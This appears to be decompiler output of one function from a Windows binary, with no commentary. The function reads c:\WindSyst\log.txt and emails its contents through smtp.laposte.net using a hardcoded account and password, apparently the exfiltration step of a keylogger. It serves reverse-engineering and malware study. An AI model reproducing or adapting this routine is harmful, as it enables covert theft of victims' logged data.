/* WARNING: Type propagation algorithm not settling */

void __fastcall FUN_004016b0(undefined4 param_1)

{
  int *piVar1;
  char *pcVar2;
  char cVar3;
  int iVar4;
  istream *piVar5;
  void *this;
  ifstream *piVar6;
  ifstream *piVar7;
  QArrayData *local_154;
  QArrayData *local_150;
  QArrayData *local_14c;
  QArrayData *local_148;
  char *local_144;
  int local_140;
  char local_13c [16];
  char *local_12c;
  uint local_128;
  char local_124 [16];
  code **local_114 [2];
  code **local_10c [3];
  undefined1 auStack_100 [16];
  locale local_f0 [8];
  __basic_file<char> local_e8 [68];
  code **local_a4 [3];
  undefined1 auStack_98 [100];
  undefined4 local_34;
  undefined1 local_30;
  undefined1 local_2f;
  undefined4 local_2c;
  undefined4 local_28;
  undefined4 local_24;
  undefined4 local_20;

  local_144 = local_13c;
  local_12c = local_124;
  local_140 = 0;
  local_13c[0] = '\0';
  local_128 = 0;
  local_124[0] = '\0';
  std::ios_base::ios_base((ios_base *)local_a4);
  local_30 = 0;
  local_a4[0] = &operator.delete_exref;
  local_34 = 0;
  local_2f = 0;
  local_114[0] = (code **)vtable_exref;
  local_2c = 0;
  local_28 = 0;
  local_24 = 0;
  local_20 = 0;
  *(code **)((int)local_114 + *(int *)(vtable_exref + -0xc)) = vtable_exref;
  local_114[1] = (code **)0x0;
  std::ios::init((streambuf *)0x0);
  local_114[0] = &operator.delete[]_exref;
  local_a4[0] = (code **)&DAT_0040e830;
  std::filebuf::filebuf((filebuf *)local_10c);
  std::ios::init((streambuf *)local_10c);
  iVar4 = std::filebuf::open("c:\\WindSyst\\log.txt",8);
  if (iVar4 == 0) {
    std::ios::clear(*(uint *)((int)auStack_100 + (int)local_114[0][-3]) | 4);
  }
  else {
    std::ios::clear(0);
  }
  while( true ) {
    piVar1 = *(int **)((int)auStack_98 + (int)local_114[0][-3]);
    if (piVar1 == (int *)0x0) {
      piVar6 = (ifstream *)std::__throw_bad_cast();
      piVar5 = (istream *)local_114;
      do {
        std::ifstream::~ifstream((ifstream *)piVar5);
        if (local_12c != local_124) {
          operator.delete(local_12c);
        }
        if (local_144 != local_13c) {
          operator.delete(local_144);
        }
        piVar7 = (ifstream *)_Unwind_Resume(piVar6);
        FUN_00407730(&local_154);
        piVar5 = (istream *)piVar6;
        piVar6 = piVar7;
      } while( true );
    }
    if ((char)piVar1[7] == '\0') {
      std::ctype<char>::_M_widen_init();
      cVar3 = '\n';
      if (*(code **)(*piVar1 + 0x18) != (code *)&DAT_00407770) {
        cVar3 = (**(code **)(*piVar1 + 0x18))(10);
      }
    }
    else {
      cVar3 = *(char *)((int)piVar1 + 0x27);
    }
    piVar5 = std::getline<>((istream *)local_114,(string *)&local_12c,cVar3);
    pcVar2 = local_144;
    if (((byte)piVar5[*(int *)(*(int *)piVar5 + -0xc) + 0x14] & 5) != 0) break;
    std::__cxx11::string::_M_append(local_12c,local_128);
  }
  if ((local_144 != (char *)0x0) && (local_140 == -1)) {
    strlen(local_144);
  }
  QString::fromUtf8_helper((char *)&local_154,(int)pcVar2);
  local_150 = (QArrayData
*)QString::fromAscii_helper("aaaaaaaaaaaa@laposte.net",0x18);
  local_14c = (QArrayData *)QString::fromAscii_helper("z98tmFrance",0xb);
  local_148 = (QArrayData *)QString::fromAscii_helper("smtp.laposte.net",0x10);
  this = operator.new(0x38);
  FUN_00401f40(this,(QString *)&local_150,(QString
*)&local_14c,(QString *)&local_148,0x1d1,30000);
  if (*(int *)local_148 == 0) {
LAB_00401c94:
    QArrayData::deallocate(local_148,2,4);
  }
  else if (*(int *)local_148 != -1) {
    LOCK();
    *(int *)local_148 = *(int *)local_148 + -1;
    UNLOCK();
    if (*(int *)local_148 == 0) goto LAB_00401c94;
  }
  if (*(int *)local_14c == 0) {
LAB_00401ba0:
    QArrayData::deallocate(local_14c,2,4);
    iVar4 = *(int *)local_150;
    if (iVar4 != 0) goto LAB_004019b2;
LAB_00401bc9:
    QArrayData::deallocate(local_150,2,4);
  }
  else {
    if (*(int *)local_14c != -1) {
      LOCK();
      *(int *)local_14c = *(int *)local_14c + -1;
      UNLOCK();
      if (*(int *)local_14c == 0) goto LAB_00401ba0;
    }
    iVar4 = *(int *)local_150;
    if (iVar4 == 0) goto LAB_00401bc9;
LAB_004019b2:
    if (iVar4 != -1) {
      LOCK();
      *(int *)local_150 = *(int *)local_150 + -1;
      UNLOCK();
      if (*(int *)local_150 == 0) goto LAB_00401bc9;
    }
  }
  QObject::connect((Connection
*)&local_148,this,"2status(QString)",param_1,"1mailSent(QString)",0);
  QMetaObject::Connection::~Connection((Connection *)&local_148);
  local_148 = (QArrayData *)QString::fromAscii_helper("aaaaa !",7);
  local_14c = (QArrayData
*)QString::fromAscii_helper("aaaaaaaaaaaa@gmail.com",0x16);
  local_150 = (QArrayData
*)QString::fromAscii_helper("aaaaaaaaaaaa@laposte.net",0x18);
  FUN_00402070(this,(QString *)&local_150,(QString
*)&local_14c,(QString *)&local_148,
               (QString *)&local_154);
  if (*(int *)local_150 == 0) {
LAB_00401c70:
    QArrayData::deallocate(local_150,2,4);
  }
  else if (*(int *)local_150 != -1) {
    LOCK();
    *(int *)local_150 = *(int *)local_150 + -1;
    UNLOCK();
    if (*(int *)local_150 == 0) goto LAB_00401c70;
  }
  if (*(int *)local_14c == 0) {
LAB_00401bf0:
    QArrayData::deallocate(local_14c,2,4);
    iVar4 = *(int *)local_148;
    if (iVar4 != 0) goto LAB_00401ac0;
LAB_00401c19:
    QArrayData::deallocate(local_148,2,4);
    iVar4 = *(int *)local_154;
  }
  else {
    if (*(int *)local_14c != -1) {
      LOCK();
      *(int *)local_14c = *(int *)local_14c + -1;
      UNLOCK();
      if (*(int *)local_14c == 0) goto LAB_00401bf0;
    }
    iVar4 = *(int *)local_148;
    if (iVar4 == 0) goto LAB_00401c19;
LAB_00401ac0:
    if (iVar4 != -1) {
      LOCK();
      *(int *)local_148 = *(int *)local_148 + -1;
      UNLOCK();
      if (*(int *)local_148 == 0) goto LAB_00401c19;
    }
    iVar4 = *(int *)local_154;
  }
  if (iVar4 != 0) {
    if (iVar4 == -1) goto LAB_00401aee;
    LOCK();
    *(int *)local_154 = *(int *)local_154 + -1;
    UNLOCK();
    if (*(int *)local_154 != 0) goto LAB_00401aee;
  }
  QArrayData::deallocate(local_154,2,4);
LAB_00401aee:
  local_114[0] = &operator.delete[]_exref;
  local_a4[0] = (code **)&DAT_0040e830;
  local_10c[0] = &vtable_exref;
  std::filebuf::close();
  std::__basic_file<char>::~__basic_file(local_e8);
  local_10c[0] = &operator.delete[]_exref;
  std::locale::~locale(local_f0);
  *(code **)((int)local_114 + *(int *)(vtable_exref + -0xc)) = vtable_exref;
  local_a4[0] = &operator.delete_exref;
  std::ios_base::~ios_base((ios_base *)local_a4);
  if (local_12c != local_124) {
    operator.delete(local_12c);
  }
  if (local_144 != local_13c) {
    operator.delete(local_144);
  }
  return;
}

